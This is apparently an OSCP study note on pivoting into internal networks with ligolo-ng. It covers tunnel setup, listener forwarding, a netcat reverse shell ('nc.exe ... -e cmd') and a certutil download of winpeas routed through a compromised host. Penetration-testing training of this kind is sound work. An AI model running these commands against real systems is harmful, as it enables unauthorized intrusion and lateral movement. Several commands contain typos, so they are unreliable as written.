# Pivoting for OSCP

{% embed url="https://www.youtube.com/watch?v=DM1B8S80EvQ&t" %}

{% embed url="https://github.com/nicocha30/ligolo-ng" %}

If we're on a Active directory machine and attacking from a kali, we have to download windows agent end linux proxy from releases:

<figure><img src="../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>

On kali:

```
sudo ip tunap add user felix mode tun logolo
sudo ip link set ligolo up
./proxy -selfcert
```

On target machine:

```
./agent.exe -connect <IP-KALI>:11601 -ignore-cert
```

back on ligolo listener:

```
session
1
start 
```

and on another terminal on kali we add the subnet we want to access:

```
sudo ip route 10.10.14.0/24 dev ligolo
```

### Reverse shells from internal network

Add listener on ligolo proxy ->

```
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
```

any connection that comes in to MS01 from port 1234 will be forwarded to our localhost on port 4444

we can check listener with

```
listener_list
```

So now we set up our listener on our kali:

```
rlwrap nc -nlvp 4444
```

Let's say MS01 has internal IP of 10.10.120.131, on our target machine we will change the IP of the listener to ip of MS01:

```
nc.exe 10.10.120.131 1234 -e cmd
```

And from that we should catch our shell up and running

### File transfer from internal network

We go back in the ligolo proxy ->

```
listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80
```

We choose port 80 because we'll run our python webserver on port 80

let's say we host winpeas ->

```
python -m http.server 80
```

on the target machine:

```
certutil -urlcache -f http://<MS01>:1235/winpeas.exe winpeas.exe
```

and the file will be transfered
